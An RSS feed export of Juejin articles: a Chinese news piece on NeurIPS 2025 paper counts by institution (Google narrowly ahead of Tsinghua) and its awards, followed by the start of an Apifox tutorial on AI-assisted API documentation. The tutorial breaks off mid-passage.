<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>掘金文章推荐</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>一个帮助开发者成长的社区</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[清华紧逼谷歌，AI顶会NeurIPS论文数第二！中国占半壁江山]]></title>    <link>https://juejin.cn/post/7581765536372703241</link>    <guid>https://juejin.cn/post/7581765536372703241</guid>    <pubDate>2025-12-10T03:07:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581765536372703241" data-draft-id="7581760987762982963" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="清华紧逼谷歌，AI顶会NeurIPS论文数第二！中国占半壁江山"/> <meta itemprop="keywords" content="人工智能,OpenAI"/> <meta itemprop="datePublished" content="2025-12-10T03:07:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="新智元"/> <meta itemprop="url" content="https://juejin.cn/user/952600743642312"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            清华紧逼谷歌，AI顶会NeurIPS论文数第二！中国占半壁江山
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/952600743642312/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    新智元
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T03:07:34.000Z" title="Wed Dec 10 2025 03:07:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/72b5816ec9de4bd0b2575faca07e0c3c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765940854&amp;x-signature=XhreqZFFygrq8lX9Amk0HlmE%2FhY%3D" alt="" loading="lazy"/></p>
<h5 data-id="heading-0"><strong>「【新智元导读】NeurIPS 2025 见证了历史性的分流：清华大学以微弱差距逼近谷歌，中国 AI 完成了从数量堆叠向底层架构创新的「质变」突围。在圣地亚哥与墨西哥城的双会场之间，签证壁垒切割了物理空间。这是一场关于算力、人才与技术定义权的「双城记」。」</strong></h5>
<p>作为全球 AI 领域的年度最大学术盛事之一，今年的 NeurIPS 呈现出一种前所未有的撕裂感：一场会议，两个主场——一边是算力与资本的圣地硅谷的「后花园」，另一边则是由于签证壁垒而被迫形成的「平行宇宙」。</p>
<p>而在 OpenReview 滚动的录取名单背后，一个更具历史意味的转折点正在浮现：清华大学，这所中国最顶尖的学府，正以一种不可阻挡的态势逼近长期的霸主谷歌。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/26b8b18347fa4acfbc45c8df12e50b82~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765940854&amp;x-signature=zqSAyi%2B%2FMsCbrFcUV%2BOTuGFBdKc%3D" alt="" loading="lazy"/></p>
<p>NeurIPS 2025 论文来源，图源：AIWorld</p>
<p>数字背后，是两个截然不同的科研生态系统在深水区的正面相遇。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c769d8e5cb094549ab883e19df2d5016~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765940854&amp;x-signature=uPo3qEa1BB0%2FPkei3oPVT5HEe9A%3D" alt="" loading="lazy"/></p>
<p><strong>「谷歌还是第一」</strong></p>
<p><strong>「但清华即将追上」</strong></p>
<p>长期以来，NeurIPS 的接收榜单是硅谷巨头们的功勋墙。</p>
<p>谷歌、Meta、微软，这些名字代表了无限的算力、顶级薪资和对未来的定义权。</p>
<p>但 2025 年的数据表明，这一格局正在松动。</p>
<p>根据 AI World 的动态数据分析，在 NeurIPS 2025 接收的 5526 篇论文中，机构版图发生了剧烈震荡：</p>
<ul>
<li>中国占据了全球半壁江山的份额。</li>
<li>谷歌依然勉强维持着全球第一的份额，占据 4.84%。</li>
<li>清华大学以 4.73% 的份额紧随其后，两者差距缩小至仅 0.11%。</li>
<li>北京大学以 3.63% 并列第三。</li>
<li>传统计算机世界四大顶尖名校则分别为：斯坦福大学（2.58%）、卡内基梅隆大学（2.55%）、麻省理工学院（2.45%）、加州大学伯克利分校（2.08%）。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/87184d16721e4e29b9ec5ebe70d905f9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765940854&amp;x-signature=jlBOs5pdB2IxdQUB9xL71x4OhKA%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/74ac74645a274350b381517b1de916ab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765940854&amp;x-signature=%2BWQ93MPTsTV7aikcN7MoY7skij4%3D" alt="" loading="lazy"/></p>
<p>图灵奖得主 Yann LeCun 也转发并发表了他的解读评论。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d6f3f48dce7347c59cf8883e779c8212~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765940854&amp;x-signature=lajNG%2B1ZAFGkZMI%2F0F1HM1K%2BeiI%3D" alt="" loading="lazy"/></p>
<p>这是一个极具象征意义的时刻。</p>
<p>在马拉松的最后冲刺阶段，领跑的硅谷巨头听到了身后沉重的呼吸声。</p>
<p>这种「高校包围巨头」的景象，揭示了中美科研生态的本质差异：</p>
<p>美国的 AI 创新高度集中在万亿市值的科技巨头手中，形成了算力与数据的垄断；</p>
<p>而中国的创新引擎则分布在顶尖高校与实验室之间，依靠极高的人才密度和政策驱动的资源倾斜，实现了惊人的爆发。</p>
<p>版图的切割线不再仅是国界，而是城市群。全球 AI 研究正在向三个核心枢纽收敛：北京、上海和旧金山湾区。</p>
<p>清华与北大的崛起是数十年基础教育投入的回响。</p>
<p>而旧金山湾区，尽管在数量上受到挑战，依然掌握着定义「下一个大事件」的话语权。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f2618976291341bc8fa9ee43f5ce88ba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765940854&amp;x-signature=IG3JGb8X4fcYPApfTrNN9NnBmJA%3D" alt="" loading="lazy"/></p>
<p><strong>「质量突围」</strong></p>
<p><strong>「从「炼丹」到定义底层」</strong></p>
<p>过去，西方学界常带着有色眼镜审视中国 AI 论文，认为多为模型微调或应用层面的「灌水」。</p>
<p>然而，NeurIPS 2025 的获奖名单像是一记重锤，击碎了这种刻板印象。</p>
<p>数量的堆叠，终于在临界点引发了质变。</p>
<p>本届大会最受瞩目的最佳论文奖（Best Paper Award）之一，花落阿里千问团队。</p>
<p>这篇题为《Gated Attention for Large Language Models》的论文，对 Transformer 核心机制进行了一次手术刀式的革新。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0f5a8f9f83aa4e8689d5e2e7397c919e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765940854&amp;x-signature=B%2BUDhA8zPWpj4u1OK4ywzkRwIUs%3D" alt="" loading="lazy"/></p>
<p>在 LLM 推理成本高企的背景下，千问团队提出了一种带有非线性和稀疏性的门控注意力机制，不仅解决了长文本处理中的「注意力陷阱」，更大幅提升了模型效率。</p>
<p>中国科技公司不再满足于做开源模型的「搬运工」，而是开始涉足底层架构的定义权。</p>
<p>当千问的研究员站在领奖台上时，他们证明了中国工业界在基础研究上，已经具备了与 DeepMind 同台竞技的硬实力。</p>
<p>与此同时，时间检验奖（Test of Time Award）颁给了十年前的经典之作《Faster R-CNN》，作者是任少卿、何恺明、Ross Girshick、孙剑。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1bbe6f758c444784851ed5a704fc5188~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765940854&amp;x-signature=D3SbBR6aWZatWag7NTSN8lYm508%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5af92955e6724e0f8a07d26d85c23a31~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765940854&amp;x-signature=jfRmgU%2FWL8r9P3z6QzgtJEvECBM%3D" alt="" loading="lazy"/></p>
<p>这个奖项像是座灯塔，提醒世界：中国研究者的崛起并非朝夕之间。</p>
<p>早在深度学习爆发初期，以微软亚洲研究院为代表的「黄埔军校」，就已埋下了影响至今的种子。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0fafbdcdc3154bec8c6ead0e3a91f4b5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765940854&amp;x-signature=1dQM7D2U0DWtydHEPIJFhbgt4%2Fg%3D" alt="" loading="lazy"/></p>
<p><strong>「被撕裂的聚会」</strong></p>
<p><strong>「签证、卫星城与人才回流」</strong></p>
<p>NeurIPS 2025 的史诗感，更来自于它所处的时代背景。</p>
<p>这届大会被深深打上了地缘政治的烙印。</p>
<p>除了圣地亚哥的主会场，大会破天荒地在墨西哥城设立了平行卫星会场。</p>
<p>这是一种无奈的妥协。</p>
<p>对于许多涉及芯片设计、大模型安全等「敏感技术」的中国学者而言，获得美国签证已成为一场概率极低的赌博。</p>
<p>于是，墨西哥城成了连接两个世界的驿站。</p>
<p>虽然物理距离上与圣地亚哥仅一墙之隔，但这两场平行的会议仿佛隐喻了「两个 AI 生态」的未来。</p>
<p>曾经「孔雀东南飞」去往美国的顶尖华人大脑，正因美国科研环境的不确定性而选择回归。</p>
<p>清华等国内研究机构的爆发，很大程度上得益于这股回流潮。</p>
<p>这些机构提供了媲美硅谷的薪资、庞大的算力资源，以及更重要的——安全感。</p>
<p>参考资料：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Faiworld.eu%2Fstory%2Ffrom-beijing-to-san-francisco-what-neurips-2025-reveals-about-ai-leadership" target="_blank" title="https://aiworld.eu/story/from-beijing-to-san-francisco-what-neurips-2025-reveals-about-ai-leadership" ref="nofollow noopener noreferrer">aiworld.eu/story/from-…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[如何在 Apifox 中借助 AI 设计一份规范的接口文档？]]></title>    <link>https://juejin.cn/post/7581738974425464851</link>    <guid>https://juejin.cn/post/7581738974425464851</guid>    <pubDate>2025-12-10T03:14:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581738974425464851" data-draft-id="7581738974424662035" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="如何在 Apifox 中借助 AI 设计一份规范的接口文档？"/> <meta itemprop="keywords" content="前端,后端,测试"/> <meta itemprop="datePublished" content="2025-12-10T03:14:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Apifox"/> <meta itemprop="url" content="https://juejin.cn/user/2766843870448222"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            如何在 Apifox 中借助 AI 设计一份规范的接口文档？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2766843870448222/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Apifox
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T03:14:47.000Z" title="Wed Dec 10 2025 03:14:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>通过 Apifox 的 <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.apifox.com%2Fapifox-idea-plugin" target="_blank" title="https://docs.apifox.com/apifox-idea-plugin" ref="nofollow noopener noreferrer">IDEA 插件</a>，或者一些 Swagger 插件，你可以很方便地将代码中的 API 生成接口文档，这解决了从零开始写文档的问题。</p>
<p>不过，即使接口写完了，文档也生成了，心里可能还是会有点不踏实，或许会斟酌<strong>这个接口设计得怎么样？文档搞得够不够规范？还有没有什么地方能再优化一下？</strong></p>
<p>特别是在团队协作中，你会希望自己写的接口文档能让其他小伙伴一看懂。命名是否清晰、信息是否完整，这些都会直接影响他们使用你接口时的体验。</p>
<p><strong>Apifox 近来陆续上线了几个 AI 功能，专门帮你在这个阶段进一步优化接口文档</strong>。不管是完善现有的接口信息，还是从其他地方导入已有的接口文档，AI 都能给你一些实用的建议。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eadb5c552fe443b6adf9297d5df365c1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQXBpZm94:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941286&amp;x-signature=w5f2DrGZrRgV%2BV%2B2cy%2BygSdqiPw%3D" alt="" loading="lazy"/></p>
<p>下面我们就来看看，如何在 Apifox 中借助 AI 设计一份更规范的接口文档。在开始之前，请确认你已经将 Apifox 更新到最新版，并已开启 <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.apifox.com%2Fenable-ai-features" target="_blank" title="https://docs.apifox.com/enable-ai-features" ref="nofollow noopener noreferrer">AI 功能</a>和配置 AI 模型。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a9e5de82ee2244679d7bb480c218d655~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQXBpZm94:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941286&amp;x-signature=WTGIPDMdikUz%2F7qjYO8BBN%2Femxk%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">从现有文档开始导入</h2>
<p>有时候你需要把其他地方的接口文档迁移到 Apifox 中。如果文档是标准格式，Apifox 本身已经支持多种导入方式：可以通过 <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.apifox.com%2Fapifox-idea-plugin" target="_blank" title="https://docs.apifox.com/apifox-idea-plugin" ref="nofollow noopener noreferrer">IDEA 插件</a>扫描代码中的接口，也可以导入 OpenAPI/Swagger 文件，还支持从 Postman 等其他工具迁移。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/460fa0a30b704c5ea5119b180e26b630~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQXBpZm94:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941286&amp;x-signature=LowYScojWl%2BF8l01CJacCZxYFjE%3D" alt="" loading="lazy"/></p>
<p>但也有一些情况下，你手头的文档可能不是这些标准格式。比如团队之前用 Markdown 记录接口，或者在 Word 文档里整理了一些字段说明，甚至是在聊天记录或邮件里找到的接口定义。这些非标准格式的内容，一个个字段录入想想都头大。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8959d8b738f6445d8daaeb7587484958~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQXBpZm94:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941286&amp;x-signature=aZvQPznlDgo2Bf%2FTaM47lND%2FVqw%3D" alt="" loading="lazy"/></p>
<p>所以在这种情况下，如果想要轻松一点，就可以用「<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.apifox.com%2Fgenerate-data-schemas-with-ai" target="_blank" title="https://docs.apifox.com/generate-data-schemas-with-ai" ref="nofollow noopener noreferrer">AI 辅助参数修改</a>」功能来帮忙录入。假设你有一段这样的 Markdown 内容：</p>
<pre><code class="hljs language-Markdown" lang="Markdown">| name       | desc                                          | type      | required |
| ---------- | --------------------------------------------- | --------- | -------- |
| usePaging  | 是否启用分页                                    | boolean   | true     |
| offset     | 起始位置（启用分页时必填）                        | int       | false    |
| pageSize   | 每页数量（启用分页时必填）                        | int       | false    |
| minPrice   | 最低价格（单位：分）                             | int       | false    |
| maxPrice   | 最高价格（单位：分）                             | int       | false    |
| brand      | 品牌编码                                       | string    | false    |
| categoryId | 商品分类 ID                                    | int       | false    |
| sortRule   | 排序方式：1→ 销量优先 2→ 价格升序 3→ 价格降序    | enum(int) | false    |
| keyword    | 搜索关键词（模糊匹配商品名）                      | string    | false    |
</code></pre>
<p>你只需要把这里的参数内容复制过来，然后告诉 AI：“帮我把这些内容转换成接口参数，注意类型和必填项”。AI 会自动识别字段名、类型、是否必填、描述等信息，并转换成 Apifox 的标准数据结构，就算里面包含枚举，也会自动整理成枚举类型。</p>
